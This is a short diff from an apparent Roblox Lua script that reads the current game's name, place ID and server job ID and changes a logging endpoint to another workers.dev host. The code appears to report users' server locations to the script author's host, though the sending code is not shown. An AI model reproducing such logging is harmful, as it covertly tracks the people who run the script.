@@ -23,7 +23,7 @@ local gamename = success and gameInfo.Name or "Unknown Game"
 local gameid = game.PlaceId
 local jobId = game.JobId
 
-local _s = "https://log.xvchubontop.workers.dev/"
+local _s = "https://log2.xvchubontop.workers.dev/"
 
 local j = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobId .. "', game:GetService('Players').LocalPlayer)"
 
